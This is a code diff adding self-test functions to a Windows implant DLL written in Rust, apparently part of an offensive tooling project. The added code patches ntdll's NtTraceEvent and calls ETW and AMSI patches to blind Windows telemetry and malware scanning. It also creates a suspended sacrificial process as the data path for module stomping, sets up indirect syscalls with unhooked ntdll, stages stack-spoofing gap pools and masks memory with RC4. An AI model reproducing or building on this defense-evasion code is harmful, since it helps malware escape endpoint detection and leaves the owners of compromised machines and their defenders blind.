@@ -403,8 +403,90 @@ pub unsafe extern "system" fn nyx_selftest_antidebug() {
 }
 
 // ============================================================================
-// hostinfo: real SessionInfo fields are non-placeholder
+// blind: P2.1b NtTraceEvent patch (xor eax,eax; ret = [31 C0 C3]). Patches
+// ntdll!NtTraceEvent's prologue so the whole EtwEventWrite* family short-
+// circuits to STATUS_SUCCESS, and verifies the bytes landed + the patch is
+// idempotent (a second call is a no-op, no second VirtualProtect).
+// Bits: 0 = patch_nt_trace_event Ok,
+//       1 = full [31 C0 C3] sequence in place (byte0==0x31, byte2==0xC3),
+//       2 = idempotent (second call Ok without re-patching),
+//       3 = NtTraceEvent was resolvable (export present in ntdll).
 // ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_blind_nttrace() {
+    let mut mask: u32 = 0;
+    // bit 3: the export itself resolves (proves PEB walk found NtTraceEvent).
+    let resolved = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent").is_some();
+    if resolved {
+        mask |= 1 << 3;
+    }
+    match crate::blind::patch_nt_trace_event() {
+        Ok(()) => {
+            mask |= 1 << 0;
+            // bit 1: the full 3-byte sequence [31 C0 C3] must be in place
+            // (byte0=0x31 xor eax,eax, byte2=0xC3 ret). already_patched checks
+            // all 3 bytes — stricter than a single-byte probe.
+            if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") {
+                if crate::blind::already_patched(addr, &crate::blind::NTTRACE_PATCH) {
+                    mask |= 1 << 1;
+                }
+            }
+            // bit 2: idempotency — second call must Ok WITHOUT re-patching
+            // (write_patch short-circuits on already_patched). Reaching here
+            // without a VirtualProtect error proves the idempotency guard.
+            if crate::blind::patch_nt_trace_event().is_ok() {
+                mask |= 1 << 2;
+            }
+        }
+        Err(_) => {}
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// inject: P2.1c module-stomping data path. Creates a sacrificial process
+// (notepad.exe) SUSPENDED via CreateProcessW, verifies the handle + pid are
+// valid (the safe prefix of module stomping — verifiable without writing or
+// executing any shellcode, so it won't trip Defender), then terminates it.
+// The actual .text stomp + resume is gated behind inject::modulestomp_enabled
+// (default OFF); this selftest exercises the data path only.
+// Bits: 0 = create_sacrificial Ok, 1 = pid nonzero, 2 = handle non-null,
+//       3 = process terminated cleanly (reached the exit).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject() {
+    let mut mask: u32 = 0;
+    // notepad.exe exists on every Windows; create it suspended (no execution).
+    let proc = match crate::inject::create_sacrificial("notepad.exe") {
+        Ok(p) => p,
+        Err(_) => unsafe { exit(mask) },
+    };
+    mask |= 1 << 0; // create_sacrificial Ok
+    if proc.pid != 0 {
+        mask |= 1 << 1;
+    }
+    if !proc.handle.is_null() {
+        mask |= 1 << 2;
+    }
+    // Terminate the suspended sacrificial process so it doesn't linger. We do
+    // NOT stomp or resume — the gate is OFF. TerminateProcess via PEB walk.
+    if let Some(tp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess") {
+        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
+        let _ = unsafe { terminate(proc.handle, 1) };
+        mask |= 1 << 3; // reached the terminate (clean teardown)
+    }
+    // Close the handles (best-effort).
+    if let Some(ch_addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+        type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+        let close: CloseHandle = unsafe { core::mem::transmute(ch_addr) };
+        let _ = unsafe { close(proc.handle) };
+        let _ = unsafe { close(proc.main_thread) };
+    }
+    unsafe { exit(mask) };
+}
 
 /// Bits: 0=hostname-nonempty-nonhost, 1=username-nonempty-nonuser, 2=pid-nonzero.
 #[no_mangle]
@@ -544,6 +626,42 @@ pub unsafe extern "system" fn nyx_selftest_hashdump_diag() {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_calib42() {
     unsafe { exit(42) };
+}
+
+// ============================================================================
+// nyx_linger: keep the implant alive + fully initialized for ~30s so an
+// external memory scanner (PE-sieve / Moneta) can attach and inspect the
+// indirect-syscall trampoline page, the unhooked ntdll, the staged GapPool,
+// etc. This is NOT a selftest (no bitmask) — it's a scan target. Exits 0.
+// Invoke: rundll32 nyx_implant_win.dll,nyx_linger  (then scan its PID).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_linger() {
+    // Bring up the full evasion runtime: indirect-syscall table + RX trampoline
+    // page + unhooked ntdll + blind + the P2.1 gap pool. This is the in-memory
+    // surface a detector inspects.
+    crate::syscalls::init_global();
+    let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
+    let _ = crate::blind::patch_amsi();
+    // Stage the P2.1 gap pool so the staged chain is live in memory too.
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        // Leak it static so spoof_wrap's global can borrow it (mirrors real init).
+        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
+        unsafe { crate::stack::set_gap_pool(leaked) };
+        let _ = crate::stack::stage_for(leaked); // warm the staging path
+    }
+    // Sleep ~30s in 1s slices so we stay responsive if killed. NtDelayExecution
+    // via the indirect runtime (exercises the trampoline page repeatedly).
+    for _ in 0..30 {
+        let rt = match crate::syscalls::global() { Some(r) => r, None => break };
+        let interval: i64 = -10_000_000; // 1s in 100ns units (negative = relative)
+        let interval_ptr = &interval as *const i64 as usize;
+        let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, interval_ptr) };
+    }
+    unsafe { exit(0) };
 }
 
 
@@ -1378,6 +1496,76 @@ pub unsafe extern "system" fn nyx_selftest_syscall_rt() {
 }
 
 // ============================================================================
+// evasion_glue: PdataGapScanner over the live ntdll/kernelbase/win32u/wow64.
+// P2.1a-i foundation: proves the PEB walk + .pdata read + gap::enumerate_gaps
+// pipeline yields a non-empty GapPool on a real Windows host. This is the gate
+// for StackSpoofKit (ii) and SleepmaskKit (iii) — both borrow this pool.
+// Bits: 0 = scan() returned Ok, 1 = gap_count>0, 2 = ghosts+nops>0,
+//       3 = ntdll specifically contributed gaps (the primary source).
+// ============================================================================
+
+/// Run `LivePdataScanner::scan()` against the REAL process modules and check
+/// the returned `GapPool` is non-empty. Writes a marker (`nyx_gap_pool.txt`)
+/// with the per-bucket counts so an external check can corroborate the bitmask.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_gap_scan() {
+    let mut mask: u32 = 0;
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        Ok(pool) => {
+            mask |= 1 << 0; // scan() Ok
+            if pool.gap_count() > 0 {
+                mask |= 1 << 1; // gap_count > 0
+            }
+            if pool.ghost_count() + pool.nop_count() > 0 {
+                mask |= 1 << 2;
+            }
+            // Corroborate ntdll as a source: re-scan just ntdll and confirm it
+            // yields gaps (ntdll always has ~thousands on Win10/11/Server).
+            let ntdll_gaps = unsafe {
+                match crate::resolve::module_base_by_name(b"ntdll.dll") {
+                    Some(base) => match crate::resolve::pdata_view(base) {
+                        Some(view) => {
+                            let entries =
+                                nyx_implant_evasionsdk::gap::RuntimeFunctionEntry::parse_table(
+                                    view.bytes,
+                                );
+                            nyx_implant_evasionsdk::gap::enumerate_gaps(
+                                &entries,
+                                view.image_size,
+                                0, // uncapped — count the real total
+                            )
+                            .len()
+                        }
+                        None => 0,
+                    },
+                    None => 0,
+                }
+            };
+            if ntdll_gaps > 0 {
+                mask |= 1 << 3;
+            }
+            // Marker for external corroboration (no format! under no_std).
+            let mut report = String::from("gaps=");
+            report.push_str(&dec_u32(pool.gap_count() as u32));
+            report.push_str(" ghosts=");
+            report.push_str(&dec_u32(pool.ghost_count() as u32));
+            report.push_str(" nops=");
+            report.push_str(&dec_u32(pool.nop_count() as u32));
+            report.push_str(" ntdll_uncapped=");
+            report.push_str(&dec_u32(ntdll_gaps as u32));
+            report.push('\n');
+            write_marker("nyx_gap_pool.txt", &report);
+        }
+        Err(_) => {
+            // scan() failed → write a marker noting the failure mode.
+            write_marker("nyx_gap_pool.txt", "scan_failed\n");
+        }
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
 // mem: mask + unmask run without corrupting the runtime state (no secret
 // statics registered yet, so this is a framework smoke test — proves the
 // guard + seed derivation don't crash). Bits: 0 = mask+unmask both ran.
@@ -1392,7 +1580,18 @@ pub unsafe extern "system" fn nyx_selftest_mem() {
     crate::mem::mask();
     crate::mem::mask();
     crate::mem::unmask();
-    mask |= 1 << 0;
+    mask |= 1 << 0; // framework guard path ran without crash
+
+    // P2.1a-iii: real RC4 round-trip via the pure core. Encrypt then decrypt a
+    // known buffer with the same derived key; it MUST come back byte-identical
+    // (RC4 is an XOR stream cipher — same key, fresh cipher, two apply_oneshot
+    // calls invert). bit1 = round-trip restored the original bytes.
+    let original: [u8; 32] = *b"nyx-rc4-roundtrip-selftest-v1!!!"; // exactly 32 bytes
+    let mut buf = original;
+    crate::mem::round_trip_selftest(&mut buf);
+    if buf == original {
+        mask |= 1 << 1;
+    }
     unsafe { exit(mask) };
 }
 
